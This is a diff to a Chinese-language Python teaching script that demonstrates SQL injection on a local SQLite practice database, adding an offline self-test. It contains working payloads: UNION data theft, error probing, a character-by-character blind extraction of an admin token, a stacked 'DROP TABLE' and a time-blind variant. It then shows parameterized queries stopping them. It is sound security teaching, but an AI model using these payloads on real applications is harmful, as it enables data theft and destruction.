@@ -24,10 +24,20 @@ Day 151 · 示例 01：SQL 注入原理与五类注入演示（基础用法）
 
 运行
 ----
-    python3 01-sql-injection-basics.py
+    python3 01-sql-injection-basics.py             # 完整演示（含真实计时的时间盲注）
+    python3 01-sql-injection-basics.py --self-test  # 离线自检（不联网、不依赖计时、秒出）
+
+⚠️ 为什么自检里**不用计时**验证时间盲注？
+    因为“跑了 97ms”这种断言天生不可靠：换台机器、旁边开个编译、
+    或者 CPU 降频，都可能让断言时对时错（flaky test）。
+    所以自检换了一个**确定性**的等价证明：把“慢表达式”换成
+    “一执行就报错的表达式”（SELECT abs(-9223372036854775808)）。
+    于是：条件为真 → 报错 = 表达式被执行了；条件为假 → 不报错 = 被跳过了。
+    这比看时间强得多：不报错就说明分支真的没执行。
 """
 
 import sqlite3
+import sys
 import time
 
 # ──────────────────────────────────────────────────────────────────
@@ -382,5 +392,157 @@ def main() -> None:
 """)
 
 
+# ════════════════════════════════════════════════════════════════
+# ④ 离线自检（--self-test）
+# ════════════════════════════════════════════════════════════════
+
+# “一执行就报错”的重表达式：abs(-9223372036854775808) 在 SQLite 里必然
+# 抛 "integer overflow"。它等价于时间盲注里的 HEAVY_EXPR，但结果确定。
+BOOM_EXPR = "(SELECT abs(-9223372036854775808))"
+
+
+def self_test() -> None:
+    """离线自检：不联网、不依赖计时、每次运行结果完全一致。
+
+    自检要证明的是**每类注入“真的成立”**，而不只是“代码能跑”：
+      • UNION / 报错 / 布尔盲注 / 堆叠：断言具体的泄漏结果为值；
+      • 时间盲注：用确定性报错替代计时（见 BOOM_EXPR）；
+      • 参数化修复：同样的 payload 必须全部返回空。
+    """
+    checks: list[tuple[str, object, object]] = []
+
+    def eq(name: str, actual: object, expected: object) -> None:
+        checks.append((name, actual, expected))
+
+    def raises(fn) -> tuple[str, str]:
+        """执行 fn，返回 (异常类名, 异常文本)；不报错则返回 ("-", "")。"""
+        try:
+            fn()
+            return "-", ""
+        except Exception as e:          # 这里就是要抓异常，类型在后面断言
+            return type(e).__name__, str(e)
+
+    # ── 0) 对照基线：正常查询长什么样 ────────────────────────
+    conn = make_range()
+    eq("正常查询返回 3 列（id, username, role）",
+       insecure_user_profile(conn, "alice"), [(2, "alice", "user")])
+    eq("不存在的用户返回空列表", insecure_user_profile(conn, "nobody"), [])
+
+    # ── ① UNION 注入 ───────────────────────────────────
+    union_payload = "nobody' UNION SELECT 1, owner, content FROM secrets--"
+    rows = insecure_user_profile(conn, union_payload)
+    eq("UNION 注入拿到了 secrets 表内容（2 行）", len(rows), 2)
+    eq("UNION 注入泄露的第一条秘密",
+       rows[0], (1, "admin", "内部定价表：成本 12.5 元 / 售价 99 元"))
+    eq("泄露的是**秘密表**而不是用户表 ⇒ 越权读取成立",
+       any("备份口令" in r[2] for r in rows), True)
+
+    # ── ② 报错注入 ───────────────────────────────────────
+    eq("单个引号 → 语法报错（证明参数被直接拼进 SQL）",
+       raises(lambda: insecure_user_profile(conn, "'"))[0], "OperationalError")
+    col_err = raises(lambda: insecure_user_profile(conn, "x' UNION SELECT 1,2--"))[1]
+    eq("列数不一致的报错告诉攻击者目标查询有几列",
+       "same number of result columns" in col_err, True)
+    tables = [r[0] for r in conn.execute(
+        "SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
+    eq("sqlite_master 能列出全部表名（结构情报）",
+       sorted(tables), ["search_log", "secrets", "users"])
+
+    # ── ③ 布尔盲注 ───────────────────────────────────────
+    eq("布尔探针：条件为真 → True", insecure_user_exists(
+        conn, "nobody' OR substr((SELECT api_token FROM users WHERE username='admin'),1,1)='t'--"), True)
+    eq("布尔探针：条件为假 → False", insecure_user_exists(
+        conn, "nobody' OR substr((SELECT api_token FROM users WHERE username='admin'),1,1)='x'--"), False)
+    # ⚠️ 文档里反复强调的坑：用 AND 的话，左边 `nobody` 已经为假，
+    #    SQL 短路求值使整个条件恒假，盲注就“问不出话”。
+    eq("把 OR 换成 AND ⇒ 恒假（盲注细节，文档里重点提醒过）",
+       insecure_user_exists(
+           conn, "nobody' AND substr((SELECT api_token FROM users WHERE username='admin'),1,1)='t'--"),
+       False)
+
+    # 真·逐字符盲取，断言提取结果就是靶场里存的 token
+    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+    token, queries = "", 0
+    for pos in range(1, 8):
+        for ch in alphabet:
+            queries += 1
+            cond = ("substr((SELECT api_token FROM users WHERE username='admin'),"
+                    f"{pos},1)='{ch}'")
+            if insecure_user_exists(conn, f"nobody' OR {cond}--"):
+                token += ch
+                break
+        else:
+            break
+    eq("布尔盲注逐字符提取出 admin 的 api_token", token, "tk9xq2")
+    eq("提取过程确实发了多次请求（盲注的成本就在这里）", queries > 100, True)
+
+    # ── ④ 时间盲注：用**确定性报错**替代计时 ────────────
+    boom_true = ("nobody' OR CASE WHEN (1=1) THEN " + BOOM_EXPR + " ELSE 0 END--")
+    boom_false = ("nobody' OR CASE WHEN (1=2) THEN " + BOOM_EXPR + " ELSE 0 END--")
+    boom_and = ("nobody' AND CASE WHEN (1=1) THEN " + BOOM_EXPR + " ELSE 0 END--")
+    eq("条件为真 → THEN 分支真的被执行了（所以时间盲注能靠耗时传信息）",
+       raises(lambda: insecure_slow_endpoint(conn, boom_true))[0], "OperationalError")
+    eq("条件为假 → 分支未执行（等价于“很快返回”）",
+       raises(lambda: insecure_slow_endpoint(conn, boom_false))[0], "-")
+    eq("用 AND 时左边已为假 → 右边被短路跳过（所以时间盲注必须用 OR）",
+       raises(lambda: insecure_slow_endpoint(conn, boom_and))[0], "-")
+    # 双重确认：SQL 直接执行 CASE，验证上面结论不是执行封装造成的假象
+    eq("SQL 层面复核：1=1 时表达式确实会执行",
+       raises(lambda: conn.execute("SELECT " + BOOM_EXPR).fetchall())[1],
+       "integer overflow")
+
+    # ── ⑤ 堆叠注入 ───────────────────────────────────────
+    conn2 = make_range()
+    eq("堆叠注入前 secrets 表存在",
+       conn2.execute("SELECT count(*) FROM secrets").fetchone()[0], 2)
+    insecure_batch_search(conn2, "x'; DROP TABLE secrets;--")
+    eq("堆叠注入把 secrets 表删了（从读升级到结构破坏）",
+       raises(lambda: conn2.execute("SELECT count(*) FROM secrets"))[0],
+       "OperationalError")
+    eq("execute() 拒绝多语句（标准库的免费防护，但不能当主防线）",
+       raises(lambda: conn2.execute("SELECT 1; DROP TABLE users;"))[0],
+       "ProgrammingError")
+
+    # ── ⑥ 参数化修复：同样的 payload 全部失效 ─────────────
+    conn3 = make_range()
+    payloads = [
+        "alice",
+        union_payload,
+        "'",
+        "x' UNION SELECT 1,2--",
+        "x'; DROP TABLE users;--",
+        "nobody' OR '1'='1",
+    ]
+    eq("参数化后正常用户仍然查得到", safe_user_profile(conn3, "alice"),
+       [(2, "alice", "user")])
+    for p in payloads[1:]:
+        eq(f"参数化后 payload 被当成普通字符串：{p[:28]}",
+           safe_user_profile(conn3, p), [])
+    eq("参数化后没有报错泄漏（无异常）",
+       raises(lambda: [safe_user_profile(conn3, p) for p in payloads])[0], "-")
+    eq("参数化后 users 表还在（堆叠注入失效）",
+       conn3.execute("SELECT count(*) FROM users").fetchone()[0], 3)
+    eq("参数化后 secrets 表也还在",
+       conn3.execute("SELECT count(*) FROM secrets").fetchone()[0], 2)
+
+    # ── 汇总 ──────────────────────────────────────────
+    bad = 0
+    for name, actual, expected in checks:
+        if actual == expected:
+            print(f"  [PASS] {name}")
+        else:
+            bad += 1
+            print(f"  [FAIL] {name}\n         实际值 = {actual!r}\n         期望值 = {expected!r}")
+    if bad:
+        print(f"\n自检失败：{bad}/{len(checks)} 项与期望不符")
+        sys.exit(1)
+    print(f"\n共 {len(checks)} 项断言全部通过")
+    print("SELF-TEST OK")
+    sys.exit(0)
+
+
 if __name__ == "__main__":
-    main()
+    if "--self-test" in sys.argv[1:]:
+        self_test()
+    else:
+        main()
